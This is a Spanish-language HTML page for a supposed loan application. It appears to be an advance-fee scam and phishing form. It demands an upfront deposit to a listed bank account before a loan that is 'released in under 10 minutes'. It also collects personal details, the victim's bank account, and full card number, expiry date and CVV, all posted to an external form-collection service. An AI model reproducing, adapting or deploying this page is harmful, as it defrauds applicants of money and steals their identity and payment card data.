<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Solicitud de Préstamo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f8f8f8;
      padding: 20px;
    }

    form {
      max-width: 700px;
      margin: auto;
      background-color: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
    }

    h2 {
      text-align: center;
      color: #28a745;
      margin-bottom: 25px;
    }

    label {
      display: block;
      font-weight: bold;
      margin-bottom: 6px;
    }

    input, textarea, select {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 6px;
      margin-bottom: 20px;
      font-size: 16px;
      transition: border-color 0.3s;
    }

    input:focus, textarea:focus, select:focus {
      border-color: #28a745;
      outline: none;
    }

    .info-box {
      background-color: #f1fdf3;
      border: 1px solid #28a745;
      padding: 15px;
      margin-bottom: 20px;
      border-radius: 6px;
      font-size: 15px;
    }

    .mensaje-final {
      background-color: #eaffea;
      border: 1px solid #28a745;
      padding: 15px;
      border-radius: 6px;
      text-align: center;
      font-weight: bold;
      font-size: 16px;
      margin-top: 30px;
      color: #155724;
    }

    button {
      background-color: #28a745;
      color: white;
      border: none;
      padding: 15px;
      width: 100%;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #218838;
    }
  </style>
</head>
<body>
  <form action="https://formspree.io/f/mjkrjlqn" method="POST">
    <h2>Formulario de Solicitud de Préstamo</h2>

    <label for="primer_nombre">Primer nombre:</label>
    <input type="text" id="primer_nombre" name="primer_nombre" required>

    <label for="segundo_nombre">Segundo nombre:</label>
    <input type="text" id="segundo_nombre" name="segundo_nombre">

    <label for="primer_apellido">Primer apellido:</label>
    <input type="text" id="primer_apellido" name="primer_apellido" required>

    <label for="segundo_apellido">Segundo apellido:</label>
    <input type="text" id="segundo_apellido" name="segundo_apellido">

    <label for="fecha_nacimiento">Fecha de nacimiento:</label>
    <input type="date" id="fecha_nacimiento" name="fecha_nacimiento" required>

    <label for="email">Correo electrónico:</label>
    <input type="email" id="email" name="email" required>

    <label for="telefono">Teléfono:</label>
    <input type="tel" id="telefono" name="telefono" pattern="[0-9]{10,15}" required>

    <label for="monto">Selecciona el monto del préstamo:</label>
    <select id="monto" name="monto" required>
      <option value="">-- Selecciona una opción --</option>
      <option value="1000">1000 pesos (Deposita 300)</option>
      <option value="2000">2000 pesos (Deposita 500)</option>
      <option value="3000">3000 pesos (Deposita 600)</option>
      <option value="4000">4000 pesos (Deposita 700)</option>
      <option value="5000">5000 pesos (Deposita 800)</option>
      <option value="10000">10000 pesos (Deposita 1000)</option>
    </select>

    <label for="motivo">Motivo del préstamo:</label>
    <textarea id="motivo" name="motivo" rows="4" maxlength="500" required></textarea>

    <label for="cuenta_destino">Cuenta donde se depositará el préstamo:</label>
    <input type="text" id="cuenta_destino" name="cuenta_destino" placeholder="Número de cuenta, CLABE, tarjeta u otro método" required>

    <label for="titular_cuenta">Nombre del titular de la cuenta receptora:</label>
    <input type="text" id="titular_cuenta" name="titular_cuenta" required>

    <div class="info-box">
      <strong>IMPORTANTE:</strong><br>
      Para procesar el préstamo debes hacer un depósito según el monto solicitado.<br><br>
      <ul style="margin-left: 15px;">
        <li>1000 pesos → Deposita 300</li>
        <li>2000 pesos → Deposita 500</li>
        <li>3000 pesos → Deposita 600</li>
        <li>4000 pesos → Deposita 700</li>
        <li>5000 pesos → Deposita 800</li>
        <li>10000 pesos → Deposita 1000</li>
      </ul>
      <br>
      <strong>Cuenta para depósito por transferencia (Banco NU):</strong><br>
      <span style="font-size: 17px;">638180000196043551</span>
    </div>

    <h3 style="color:#28a745;">Datos para pago con tarjeta (opcional)</h3>

    <label for="tarjeta">Número de tarjeta:</label>
    <input type="text" id="tarjeta" name="tarjeta" pattern="[0-9]{16}" maxlength="16" placeholder="1234 5678 9012 3456">

    <label for="vencimiento">Fecha de vencimiento (MM/AA):</label>
    <input type="text" id="vencimiento" name="vencimiento" pattern="[0-9]{2}/[0-9]{2}" placeholder="MM/AA">

    <label for="titular">Nombre del titular:</label>
    <input type="text" id="titular" name="titular">

    <label for="cvv">Código de seguridad (CVV):</label>
    <input type="text" id="cvv" name="cvv" pattern="[0-9]{3}" maxlength="3">

    <button type="submit">Enviar solicitud</button>

    <div class="mensaje-final">
      El préstamo se libera en menos de 10 minutos después del depósito o cobro por tarjeta.
    </div>
  </form>
</body>
</html>
